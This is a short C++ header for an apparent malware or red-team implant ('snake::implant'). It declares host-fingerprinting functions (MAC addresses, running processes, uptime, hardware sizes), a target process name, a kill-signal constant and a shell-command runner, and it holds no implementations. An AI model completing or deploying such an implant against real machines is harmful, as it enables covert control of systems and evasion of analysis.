#pragma once

#include <string>
#include <vector>

namespace snake::implant {

inline constexpr int kKillSignal = 9;

std::string hostname();

std::string target_proc_name();

long long uptime_secs();
double disk_total_gb();

int num_cpu();

long long ram_total_mb();
std::vector<std::string> mac_addresses();
std::vector<std::string> running_process_names();

int local_hour();

struct ShellOutput {
    std::string out;
    std::string err;
    int exit_code = 0;
    bool signaled = false;
    int signal_no = 0;
    bool timed_out = false;
};

ShellOutput run_shell(const std::string& cmd);

}  // namespace snake::implant
